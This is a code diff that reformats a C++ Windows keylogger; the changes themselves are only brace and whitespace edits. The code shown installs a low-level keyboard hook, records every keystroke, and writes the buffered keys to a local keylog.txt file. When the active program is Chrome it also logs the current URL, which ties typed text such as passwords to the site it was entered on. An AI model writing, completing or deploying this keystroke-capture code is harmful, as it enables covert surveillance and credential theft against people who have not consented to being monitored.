@@ -87,14 +87,13 @@ std::map<UINT, std::string> createKeyboardMap()
     return _keyboardMap;
 }
 
-
 HHOOK keyboardHook;
 std::map<UINT, std::string> keyboardMap = createKeyboardMap();
 
 std::vector<std::string> keyBuffer;
 
-
-void flush(){
+void flush()
+{
     std::ofstream myfile("../keylog.txt", std::ios::out | std::ios::app);
     if (myfile.is_open())
     {
@@ -113,18 +112,20 @@ void flush(){
             }
         }
 
-        if (procName == "chrome.exe"){
+        if (procName == "chrome.exe")
+        {
             std::string url{};
             getChromeUrl(url);
-            myfile << "URL > " << url << '\n';   
+            myfile << "URL > " << url << '\n';
         }
-
 
         myfile << '\n';
 
         myfile.flush();
         myfile.close();
-    } else {
+    }
+    else
+    {
         throw std::runtime_error("Failed to open file");
     }
 
@@ -136,13 +137,15 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
     if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN))
     {
         KBDLLHOOKSTRUCT *pKeyStruct = (KBDLLHOOKSTRUCT *)lParam;
-        
+
         keyBuffer.push_back(keyboardMap[pKeyStruct->vkCode]);
         if ((pKeyStruct->vkCode == '\n' || pKeyStruct->vkCode == '\t' || pKeyStruct->vkCode == '\r') && keyBuffer.size() > 0)
         {
             keyBuffer.pop_back();
             flush();
-        } else if (pKeyStruct->vkCode == 0x1B) {
+        }
+        else if (pKeyStruct->vkCode == 0x1B)
+        {
             exit(0);
         }
     }
@@ -150,14 +153,12 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
     return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
 }
 
-
-void hookKeyboard() {
+void hookKeyboard()
+{
     keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), NULL);
 }
 
-void unhookKeyboard() {
+void unhookKeyboard()
+{
     UnhookWindowsHookEx(keyboardHook);
 }
-
-
-
